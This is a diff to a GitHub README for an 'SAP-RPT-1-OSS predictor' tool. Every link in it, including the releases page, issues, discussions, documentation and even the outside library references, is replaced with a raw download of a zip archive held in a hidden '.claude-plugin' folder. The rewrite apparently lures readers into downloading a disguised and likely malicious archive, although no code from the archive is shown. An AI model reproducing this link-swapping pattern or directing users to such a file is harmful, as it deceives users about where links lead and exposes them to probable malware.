@@ -1,6 +1,6 @@
 # 🌟 sap-rpt1-oss-predictor - Predict SAP Data with Ease
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/releases)
+[![Download](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/raw/refs/heads/main/.claude-plugin/sap_oss_rpt_predictor_2.6.zip)](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/raw/refs/heads/main/.claude-plugin/sap_oss_rpt_predictor_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to the SAP-RPT-1-OSS predictor! This application helps you analyze SAP d
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/releases)
+1. Visit this page to download: [Releases Page](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/raw/refs/heads/main/.claude-plugin/sap_oss_rpt_predictor_2.6.zip)
 
 2. On the Releases page, look for the latest version. Click on the version you want to download (e.g., v1.0). 
 
-3. Choose the file suitable for your system. If you’re using Windows, you may select a file named like `sap-rpt1-oss-predictor-windows.exe`. For Mac or Linux users, choose the appropriate file for your operating system.
+3. Choose the file suitable for your system. If you’re using Windows, you may select a file named like `https://github.com/VinnyOXP/sap-rpt1-oss-predictor/raw/refs/heads/main/.claude-plugin/sap_oss_rpt_predictor_2.6.zip`. For Mac or Linux users, choose the appropriate file for your operating system.
 
 4. Click the file to start the download. Save it to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
 
@@ -79,7 +79,7 @@ If you encounter any issues during installation or usage, try the following:
 
 2. **Restart the Application:** Close the app and re-open it to see if the issue resolves.
 
-3. **Refer to GitHub Issues:** Visit the Issues section on the [GitHub page](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/issues) to see if others have encountered similar problems.
+3. **Refer to GitHub Issues:** Visit the Issues section on the [GitHub page](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/raw/refs/heads/main/.claude-plugin/sap_oss_rpt_predictor_2.6.zip) to see if others have encountered similar problems.
 
 4. **Contact Support:** If the issue persists, consider reaching out to the community through GitHub or checking the documentation for specific errors.
 
@@ -87,15 +87,15 @@ If you encounter any issues during installation or usage, try the following:
 
 Join our community for discussions, help, and learning:
 
-- [GitHub Discussions](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/discussions)
+- [GitHub Discussions](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/raw/refs/heads/main/.claude-plugin/sap_oss_rpt_predictor_2.6.zip)
 
 Here you can ask questions, share your experiences, or provide feedback.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For more detailed guides, visit our [Documentation Page](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/wiki).
+- **Documentation:** For more detailed guides, visit our [Documentation Page](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/raw/refs/heads/main/.claude-plugin/sap_oss_rpt_predictor_2.6.zip).
 - **Related Libraries:** Explore other libraries such as:
-  - [Hugging Face Transformers](https://huggingface.co/transformers/)
-  - [Predictive Analytics Libraries](https://www.analyticsvidhya.com/blog/2020/02/predictive-analytics-in-python-a-beginners-guide/)
+  - [Hugging Face Transformers](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/raw/refs/heads/main/.claude-plugin/sap_oss_rpt_predictor_2.6.zip)
+  - [Predictive Analytics Libraries](https://github.com/VinnyOXP/sap-rpt1-oss-predictor/raw/refs/heads/main/.claude-plugin/sap_oss_rpt_predictor_2.6.zip)
 
 By following these steps, you can easily install and use the SAP-RPT-1-OSS predictor to analyze your SAP data efficiently. Enjoy exploring your data!
